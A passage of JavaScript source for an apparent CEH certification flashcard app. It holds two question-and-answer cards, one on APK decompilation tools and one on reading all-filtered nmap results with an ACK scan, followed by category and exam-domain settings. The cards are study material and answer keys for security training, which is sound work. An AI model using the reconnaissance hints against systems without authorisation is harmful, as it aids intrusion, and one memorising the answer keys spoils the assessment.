  { id:199, cat:"Mobile", diff:"M", q:"What is Android APK reverse engineering and what tools are used?", a:"Decompiling an APK to examine source code, hardcoded credentials, API endpoints, and logic flaws. Tools: apktool (decompile/recompile APK resources), jadx (Java decompiler from DEX bytecode), dex2jar + JD-GUI (alternative decompilation chain). Find: hardcoded keys, debug endpoints, insecure logic." },
  { id:200, cat:"Scenario", diff:"H", q:"A CEH finds nmap returns all 65535 ports as 'filtered' on a target. What does this indicate?", a:"A stateful firewall is silently dropping packets (no RST, no ICMP unreachable). 'Filtered' = no response received. All ports filtered suggests a blanket DROP policy on the perimeter firewall. Next step: try scanning from a different source IP, or use ACK scan (-sA) to map firewall rules and find stateful vs stateless filtering." },
];

const CATEGORIES = ["All", ...Array.from(new Set(CARDS.map(c => c.cat)))];
const DIFFS = ["All", "E", "M", "H"];
const DIFF_LABELS = { E: "Easy", M: "Medium", H: "Hard" };
const DIFF_COLORS = { E: "#4ade80", M: "#fbbf24", H: "#f87171" };

const CAT_COLORS = {
  Foundations:"#60a5fa", Footprinting:"#34d399", Scanning:"#a78bfa",
  Enumeration:"#22d3ee", "Vuln Analysis":"#fbbf24", "System Hacking":"#f87171",
  Malware:"#c084fc", Sniffing:"#2dd4bf", "Social Eng.":"#fb923c",
  "DoS / DDoS":"#f43f5e", "Session Hijack":"#818cf8", "IDS/Firewall":"#38bdf8",
  "Web Servers":"#0891b2", "Web Apps":"#4ade80", SQLi:"#d97706",
  Wireless:"#ec4899", Mobile:"#06b6d4", "IoT / OT":"#84cc16",
  Cloud:"#8b5cf6", Cryptography:"#3b82f6", Pentest:"#10b981",

};

const DOMAINS = [
  {
    key:"tools", label:"Tools / Systems", weight:"32%", color:"#a78bfa",
    cats:["Tools","Scanning","Enumeration","System Hacking","Ports"],
    desc:"Nmap flags, Metasploit, hacking tools & commands, port knowledge",
  },
  {
    key:"security", label:"Security", weight:"25%", color:"#f87171",
    cats:["Web Apps","SQLi","Malware","Wireless","Sniffing","IDS/Firewall",
          "Session Hijack","DoS / DDoS","Web Servers","Cryptography",
          "Mobile","IoT / OT","Cloud","Social Eng."],
    desc:"Attack types, defences, protocols, cryptographic concepts",
  },
  {
    key:"procedures", label:"Procedures / Methodology", weight:"20%", color:"#34d399",
